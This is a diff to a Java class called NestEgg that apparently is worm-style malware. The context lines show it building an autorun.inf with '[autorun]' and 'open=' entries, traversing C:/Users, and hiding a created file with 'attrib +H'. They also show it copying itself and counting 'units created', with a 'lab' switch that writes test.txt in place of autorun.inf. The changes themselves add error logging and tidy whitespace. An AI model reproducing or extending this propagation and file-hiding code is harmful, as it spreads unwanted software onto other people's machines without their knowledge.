@@ -15,6 +15,7 @@ public class NestEgg {
 	static String[] inCodedW= {"[autorun]","open="};
 	static int unitCopys=0;
 	static int unitNum;
+	static String error ="";
 public static void labEgg(Path vPath,int unitNumber){
 	File users= new File("C:/Users");
 	unitNum=unitNumber;
@@ -60,6 +61,7 @@ public static String createFilePath(String userPath, boolean lab){
 		docCP = doc.getCanonicalPath();
 	} catch (IOException e1) {
 		// TODO Auto-generated catch block
+		error= error+ " canonicalPath1";
 		e1.printStackTrace();
 	}
 	File uP=new File(docCP+"/vn");
@@ -68,6 +70,7 @@ public static String createFilePath(String userPath, boolean lab){
 			uP.createNewFile();
 		} catch (IOException e) {
 			System.out.println("interfearence");
+			error=error+" can't create new file";
 			e.printStackTrace();
 		}
 		
@@ -78,6 +81,7 @@ public static String createFilePath(String userPath, boolean lab){
 			Runtime.getRuntime().exec("attrib +H "+uP.getCanonicalPath());
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
+			error=error+" can't hide file";
 			e.printStackTrace();
 		}
 	}
@@ -86,6 +90,7 @@ public static String createFilePath(String userPath, boolean lab){
 		uPCP = uP.getCanonicalPath();
 	} catch (IOException e) {
 		// TODO Auto-generated catch block
+		error= error+ " canonicalPath2";
 		e.printStackTrace();
 	}
 	return uPCP ;
@@ -100,8 +105,16 @@ public static void createCopy(String filePath,Path vPath,boolean lab){
 		 if(conf.exists()==false){
 			 conf.createNewFile();
 		 }
+		 FileWriter fw;
+		 fw = new FileWriter(conf.getAbsolutePath());
+		 BufferedWriter writing= new BufferedWriter(fw);
 		
-		}
+				writing.write(error);
+				writing.newLine();
+				 writing.close();
+				}
+			   
+		
 		
 		
 		
@@ -142,6 +155,7 @@ public static void copyMode(String filePath){
 		}
 	}
 }
+
 public static int getUnitsCreated(){
 	return unitCopys;
 	
@@ -149,7 +163,7 @@ public static int getUnitsCreated(){
 public static void createAutoRun(boolean lab, String filePath) throws IOException{
 	FileWriter fw;
 	if(lab==true){
-	fw = new							 FileWriter(filePath+"/test.txt");
+	fw = new FileWriter(filePath+"/test.txt");
 	}else{ fw= new FileWriter(filePath+"/autorun.inf");}
 		BufferedWriter writing= new BufferedWriter(fw);
 	
